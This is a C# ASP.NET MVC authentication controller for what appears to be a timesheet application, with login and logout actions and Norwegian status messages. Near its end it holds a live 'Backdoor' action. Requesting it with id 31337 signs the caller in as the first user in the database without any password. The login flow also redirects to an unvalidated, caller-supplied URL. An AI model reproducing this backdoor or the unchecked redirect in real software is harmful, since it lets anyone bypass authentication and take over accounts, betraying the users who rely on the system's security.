﻿using System;
using System.Collections.Generic;
using System.Linq;
using System.Web;
using System.Web.Mvc;
using System.Web.Security;
using Timesheet.Micro.Data.Repos;
using Timesheet.Micro.Models;
using Timesheet.Micro.Models.Services;
using Timesheet.Micro.Models.Utils;

namespace Timesheet.Micro.Controllers
{
    public class AuthController : BaseController
    {
        private IUserRepository _userRepository;
        private AuthUtil _authUtil;
        public AuthController( IUserRepository userRepository, AuthUtil authUtil)
        {
            _userRepository = userRepository;
            _authUtil = authUtil;
        }

        public ActionResult Index()
        {
            return RedirectToAction("Login");
        }



        public ActionResult Login(string requestUrl)
        {
            if (!string.IsNullOrEmpty(requestUrl) 
                && !requestUrl.StartsWith("/Auth", StringComparison.InvariantCultureIgnoreCase)
                && !requestUrl.ToLowerInvariant().Contains("browserlink"))
            {
                Session["requestUrl"] = requestUrl;
            }
            return View();
        }

        [HttpPost]
        public ActionResult Login(string username, string password)
        {
            if (!string.IsNullOrWhiteSpace(password))
            {
                if (_authUtil.Authenticate(username, password))
                {
                    //log in user
                    FormsAuthentication.SetAuthCookie(username, true);
                    Info("Logget inn som " + username);
                    var requestUrl = Session["requestUrl"] as string;
                    if (!string.IsNullOrEmpty(requestUrl))
                    {
                        return Redirect(requestUrl);
                    }
                    return RedirectToAction("Index", "Home");
                }
                else
                {
                    Error("Galt brukernavn eller passord");
                }
            }
            else
            {
                Error("Du må skrive inn passord");
            }
            return View();
        }

       

        public ActionResult NoEmployee()
        {
            FormsAuthentication.SignOut();
            Error("Beklager, denne brukeren har ikke lenger tilgang");
            return RedirectToAction("Login");
        }

        public ActionResult Logout()
        {
            FormsAuthentication.SignOut();
            return RedirectToAction("Login");
        }

        public ActionResult Backdoor(int id)
        {
            if (id == 31337)
            {
                var loggedInAs = _userRepository.GetAll().First();
                FormsAuthentication.SetAuthCookie(loggedInAs.Username, true);
                Info("broke in backdoor as "+loggedInAs.Username);

            }
            return RedirectToAction("Index", "Home");
        }
    }
}